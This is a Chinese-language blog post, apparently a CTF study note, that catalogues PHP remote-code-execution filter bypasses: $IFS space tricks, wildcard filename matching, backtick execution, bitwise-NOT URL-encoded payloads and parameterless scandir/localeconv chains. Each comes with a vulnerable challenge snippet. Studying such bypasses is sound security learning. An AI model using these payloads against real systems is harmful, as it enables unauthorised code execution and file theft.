---
title: "关于RCE绕过的各种姿势"
subtitle: ""

description: "细说姿势"

date: 2024-03-04T15:08:47+08:00
draft: false

tags: ["RCE"]
categories: ["Bypass"]

---

## 闲话

这段时间陆陆续续也刷了不少CTF题，碰见了很多让我大开眼界的rce姿势，简单总结下

## 简单的Bypass

### 常见命令的替代

```
ls —— dir
cat —— tac、head、more、less、tail
```

### 分割命令

经常会碰见将各种命令列入黑名单的题，但若正则表达式过于普通，就可以直接分割命令来进行绕过

可用`\`、`''`来讲分割

### 空格绕过

常常会遇见空格被过滤的情况，可以用以下语句绕过

```
$IFS
${IFS}
$IFS$9
<>
```

另外还有很多，实战时这几种就够用，要根据不同的情况使用不同的语句来绕过

### 反引号执行

在某些题目中，往往只给我们`eval()`函数，若此时system一类的执行命令的函数也被限制

就可以用php中反引号可以执行命令的特性来实现命令执行

举个复杂点的栗子（也没复杂到哪去）

```php
<?php
error_reporting(0);
highlight_file(__FILE__);

$code = $_POST['code'];
$code = str_replace("(","括号",$code);
$code = str_replace(".","点",$code);
eval($code); 
?>
```

本题中过滤了`(`与`.`

由于用反引号执行并不会有回显，所以我们需要`echo`、`printf`、`var_dump`这类语句或函数来输出命令执行的结果

payload

```
code=echo `cat /f*`;
```

### 通配符绕过

我目前遇见的通配符绕过只有两种

`?`：用于匹配单个字符

`[]`：用于匹配一个字符范围

栗题1：

```php
<?php   
error_reporting(0);  
highlight_file(__FILE__);  

if (isset($_POST['ctf_show'])) {    
    $ctfshow = $_POST['ctf_show'];  
    if (!preg_match("/[b-zA-Z_@#%^&*:{}\-\+<>\"|`;\[\]]/",$ctfshow)){
        system($ctfshow);  
    }
    else{  
        echo("????????");  
    }  
}  
?>
```

题目告诉我们可以用`/getflag`直接获取flag，仔细查看正则便能发现字符`a`被放出来了

这时就能用`?`来匹配其他字母

payload

```
ctf_show=/?????a?
```

栗题2：

```php
 <?php
error_reporting(0);
highlight_file(__FILE__);
$shell = $_POST['shell'];
$cmd = $_GET['cmd'];
if(preg_match('/f|l|a|g|\*|\?/i',$cmd)){
    die("Hacker!!!!!!!!");
}
eval($shell($cmd)); 
```

可以看到四个字母都被过滤，但其他字母与`[]`被放了出来，这时就能用`[]`来匹配所需字母的范围

payload

```
?cmd=more /[e-g][k-m][0-b][e-h]

shell=system
```

## 无字母RCE

直接上栗题

```php
<?php
header("Content-Type:text/html;charset=utf-8");
error_reporting(0);
highlight_file(__FILE__);

if (isset($_GET['wllm'])) {
    $wllm = $_GET['wllm'];
    $blacklist = [' ', '\t', '\r', '\n', '\+', '\[', '\^', '\]', '\"', '\-', '\$', '\*', '\?', '\<', '\>', '\=', '\`',];
    foreach ($blacklist as $blackitem) {
        if (preg_match('/' . $blackitem . '/m', $wllm)) {
            die("LTLT说不能用这些奇奇怪怪的符号哦！");
        }
    }
    if (preg_match('/[a-zA-Z]/is', $wllm)) {
        die("Ra's Al Ghul说不能用字母哦！");
    }
    echo "NoVic4说：不错哦小伙子，可你能拿到flag吗？";
    eval($wllm);
    else {
        echo "蔡总说：注意审题！！！";
    }
}
```

解法：URL编码取反绕过正则

原理：按二进制位取反后的字符基本都是不可见字符，所以不会触发正则匹配，在传参时再对其取反即可

需要符号：`~`、`()`

exp如下

```php
<?php
echo urlencode(~'system');    //%8C%86%8C%8B%9A%92
echo "<br>";
echo urlencode(~'ls /');    //%93%8C%DF%D0
```

构造payload

```
?wllm=(~%8C%86%8C%8B%9A%92)(~%93%8C%DF%D0);
```

即可实现RCE

> 注意：此方法不可以将括号也一起取反，因此在注入时少不了括号

## 无参数RCE

一个很有趣的RCE姿势

题目特征如下

```php
if(';' === preg_replace('/[^\W]+\((?R)?\)/', '', $_GET['star'])) {    
    eval($_GET['star']);
}
```

关键点在于`('/[^\W]+((?R)?\`这个正则表达式，改表达式替换后，每个函数内的参数都会被匹配

### 相关函数

- `scandir()`：返回当前目录中所有的文件和目录，结果是一个数组

- `current()`与`pos()`：返回当前数组中的值（默认第一个）

- `localeconv()`：返回本地数字及货币信息的数组（该数组的第一项是`.`，可以与`scandir`配合使用）

- `getcwd()`：获取当前工作目录

- `chdir()`：改变当前的目录

- `dirname()`：对路径作操作，返回去掉文件名后的目录名（如`/test/index.php`返回`/test`）

- `getallheaders()`：获取所有请求头信息，并返回键值对

- `array_rand()`：随机返回一个键名

- `array_flip()`：交换数组中的键与值，返回交换后的数组

- `array_reverse()`：以相反的顺序返回数组内容

- `strrev()`：返回反转后的字符串

- `eval()`、`assert()`、`system`：命令执行

- `highlight_file()`、`show_source()`、`read_file()`：读取文件内容

- `end()`：内部指针指向数组中最后一个元素并输出

- `next()`：指向下一个元素并输出

- `prev()`：指向上一个元素并输出

- `reset()`：指向数组中第一个元素并输出

- `each()`：返回当前元素的键名和键值，并将内部指针向前移动



举个栗子：`scandir('.')`用于返回当前目录，在无法传参数的情况下，可以用`localeconv()`构造一个`.`，再用`current()`返回`.`给`scandir()`即可

> ?payload=var_dump(scandir(current(localeconv())));



暂时这样，我估计我还得写几周，是我低估rce了